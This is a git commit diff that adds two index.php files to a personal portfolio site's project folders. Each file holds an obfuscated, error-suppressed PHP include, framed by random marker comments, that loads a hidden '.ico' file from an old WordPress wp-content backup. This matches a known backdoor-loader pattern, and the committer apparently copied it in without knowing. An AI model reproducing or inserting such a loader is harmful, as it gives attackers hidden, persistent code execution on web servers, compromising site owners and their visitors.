0160514e9f522c1df31ac479237fb0933fd594c8
Ryan Devenish <57681497+ryan-devenish@users.noreply.github.com>
2023-01-18 06:51:44 -0800

    current portfolio clone

---
+++ projects/logitech-revue/index.php
@@ -0,0 +1,8 @@
+<?php
+
+/*beb26*/
+
+@include "\057home\057ryan\144even\151sh/r\171ande\166enis\150.com\057back\165ps/r\171ande\166enis\150-dot\055com-\157ld/w\160-con\164ent/\056a7a7\0713e6.\151co";
+
+/*beb26*/
+
---
+++ projects/opower-web/index.php
@@ -0,0 +1,8 @@
+<?php
+
+/*7a158*/
+
+@include "\057hom\145/ry\141nde\166eni\163h/r\171and\145ven\151sh.\143om/\142ack\165ps/\162yan\144eve\156ish\055dot\055com\055old\057wp-\143ont\145nt/\056a7a\06793e\066.ic\157";
+
+/*7a158*/
+
